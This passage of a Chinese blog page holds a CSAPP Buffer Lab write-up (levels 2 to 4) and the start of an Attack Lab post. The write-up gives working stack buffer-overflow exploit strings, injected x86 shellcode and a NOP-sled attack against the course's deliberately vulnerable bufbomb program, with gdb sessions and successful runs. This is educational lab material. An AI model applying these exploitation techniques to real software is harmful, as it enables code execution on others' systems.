class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x80491fa</span><br><span class="line">(gdb) run -u BlackDragon</span><br><span class="line">Starting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</span><br><span class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</span><br><span class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x0804920a &lt;+22&gt;:	leave  </span><br><span class="line">   0x0804920b &lt;+23&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$1</span> = 0x55682f18</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$2</span> = 0x55682f50</span><br></pre></td></tr></table></figure></p>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</span><br><span class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure></p>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </span><br><span class="line"></span><br><span class="line">level2-exploit.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</span><br><span class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</span><br><span class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   d:	c3                   	ret     </span><br></pre></td></tr></table></figure>　</p>
<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</span><br><span class="line">b8 4c 92 de 3d a3 00 d1</span><br><span class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</span><br><span class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</span><br></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段2完成。</p>
<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
<ol>
<li>在栈上执行机器代码</li>
<li>将返回指针置于代码的起始</li>
<li>修复对栈造成的破坏</li>
</ol>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路如下：</p>
<ol>
<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
<li>然后再将返回值（%eax）设置为cookie</li>
<li>最终修改栈顶（%esp）并ret</li>
</ol>
<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
<ol>
<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
</ol>
<p>下面我们讨论一下攻击代码中具体的细节。</p>
<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></span><br><span class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></span><br><span class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</span><br><span class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</span><br><span class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</span><br><span class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</span><br><span class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</span><br><span class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</span><br><span class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</span><br><span class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</span><br><span class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</span><br><span class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</span><br><span class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</span><br><span class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</span><br><span class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</span><br><span class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</span><br><span class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</span><br><span class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</span><br><span class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048ded:       <span class="number">08</span></span><br><span class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</span><br><span class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</span><br><span class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</span><br><span class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048e13:       <span class="number">08</span></span><br><span class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</span><br><span class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</span><br><span class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</span><br><span class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p>
<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</span><br><span class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</span><br><span class="line">b8 4c 92 de 3d 83 ec 04</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></p>
<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Boom!: getbuf returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段3完成。</p>
<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</span><br><span class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</span><br><span class="line">68 55 68 be 8d 04 08 c3</span><br></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Boom!: getbuf returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
</blockquote>
<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</span><br><span class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</span><br></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段4完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/05/16/深入理解计算机系统BufferLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                            深入理解计算机系统AttackLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-05-09T13:56:05+08:00">
	
		    5月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab" target="_blank" rel="noopener">Github</a>上</p>
<blockquote>
<p>花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented Programming）两种攻击方式，分别修改具有缓冲区溢出漏洞的两个x86_64可执行文件的行为。</p>
<p>本实验主要加深了对于栈规则的理解，以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>本实验使用了官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="noopener">Ubuntu 12.4 targets</a>，并且使用了运行时参数-q来避免该程序连接远程的计分服务器。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中的target1.tar主要包含了以下文件：</p>
<ul>
<li>README.txt 描述了目录内容</li>
<li>ctarget 一个易受代码注入攻击的可执行程序</li>
<li>rtarget 一个易受返回导向编程攻击的可执行程序</li>
<li>cookie.txt 在攻击中用到的唯一标识符，是8位的16进制代码</li>
<li>farm.c 目标程序的”Gadget Farm”的源代码，你将利用这些代码去生成返回导向编程攻击</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>答案不能使用攻击去避免程序的正确性检查代码。具体来说，ret指令返回的目的地只能是以下3种：</p>
<ul>
<li>函数touch1, touch2, touch3的地址</li>
<li>攻击注入代码的地址</li>
<li>gadget farm中gadgets的地址</li>
</ul>
<p>rtarget中只能用函数start_farm和函数end_farm之间的函数来生成gadget。</p>
